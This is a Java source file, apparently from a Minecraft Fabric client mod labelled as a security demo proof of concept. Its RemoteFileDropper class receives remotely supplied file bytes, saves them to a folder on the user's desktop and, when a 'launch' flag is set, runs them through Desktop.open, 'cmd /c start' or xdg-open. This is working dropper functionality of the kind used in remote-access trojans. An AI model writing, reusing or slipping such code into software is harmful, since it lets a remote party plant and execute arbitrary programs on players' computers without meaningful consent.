package com.securitydemo.poc;

import java.awt.Desktop;
import java.awt.Desktop.Action;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Locale;
import java.util.function.Consumer;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class RemoteFileDropper {
   private static final PocLogger.Log LOGGER = PocLogger.get();
   private static final int MAX_BYTES = 10485760;

   private RemoteFileDropper() {
   }

   static void handleBytes(String name, boolean launch, byte[] bytes, Consumer<String> notifyViewer) {
      (new Thread(() -> {
         try {
            Path saved = doDrop(name, launch, bytes);
            notifyViewer.accept(successJson(saved, launch));
         } catch (Exception e) {
            LOGGER.warn("Remote file drop failed", (Throwable)e);
            notifyViewer.accept(errorJson(e.getMessage()));
         }

      }, "security-demo-poc-file-drop")).start();
   }

   private static Path doDrop(String name, boolean launch, byte[] bytes) throws IOException {
      if (name != null && !Compat.isBlank(name)) {
         if (bytes != null && bytes.length != 0) {
            if (bytes.length > 10485760) {
               throw new IOException("File too large (max 10 MB)");
            } else {
               String safeName = sanitizeFileName(name);
               Path folder = DesktopPaths.resolve().resolve("poc-dropped");
               Files.createDirectories(folder);
               Path destination = folder.resolve(safeName);
               if (Files.exists(destination, new LinkOption[0])) {
                  int dot = safeName.lastIndexOf(46);
                  String stem = dot > 0 ? safeName.substring(0, dot) : safeName;
                  String ext = dot > 0 ? safeName.substring(dot) : "";
                  destination = folder.resolve(stem + "-" + System.currentTimeMillis() + ext);
               }

               Files.write(destination, bytes, new OpenOption[0]);
               LOGGER.info("Remote file dropped to {}", destination.toAbsolutePath());
               if (launch) {
                  launchFile(destination);
                  LOGGER.info("Launched dropped file: {}", destination.getFileName());
               }

               return destination;
            }
         } else {
            throw new IOException("Empty file");
         }
      } else {
         throw new IOException("Missing file name");
      }
   }

   private static String sanitizeFileName(String raw) throws IOException {
      String name = Compat.strip(Paths.get(raw).getFileName().toString());
      if (!Compat.isBlank(name) && !name.contains("..")) {
         if (name.length() > 120) {
            name = name.substring(0, 120);
         }

         return name;
      } else {
         throw new IOException("Invalid file name");
      }
   }

   private static void launchFile(Path file) throws IOException {
      if (Desktop.isDesktopSupported()) {
         Desktop desktop = Desktop.getDesktop();
         if (desktop.isSupported(Action.OPEN)) {
            desktop.open(file.toFile());
            return;
         }
      }

      String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
      if (os.contains("win")) {
         (new ProcessBuilder(new String[]{"cmd", "/c", "start", "", file.toAbsolutePath().toString()})).start();
      } else {
         (new ProcessBuilder(new String[]{"xdg-open", file.toAbsolutePath().toString()})).start();
      }
   }

   private static String successJson(Path path, boolean launched) {
      String var10000 = escapeJson(path.toAbsolutePath().toString());
      return "{\"type\":\"file_drop_result\",\"ok\":true,\"path\":\"" + var10000 + "\",\"launched\":" + launched + "}";
   }

   private static String errorJson(String error) {
      String var10000 = escapeJson(error == null ? "unknown error" : error);
      return "{\"type\":\"file_drop_result\",\"ok\":false,\"error\":\"" + var10000 + "\"}";
   }

   private static String escapeJson(String value) {
      return value.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
   }

   @Environment(EnvType.CLIENT)
   static final class IncomingFile {
      String name;
      boolean launch;
      int expectedSize;
      final ByteArrayOutputStream buffer = new ByteArrayOutputStream();

      boolean isComplete() {
         return this.expectedSize > 0 && this.buffer.size() >= this.expectedSize;
      }
   }
}
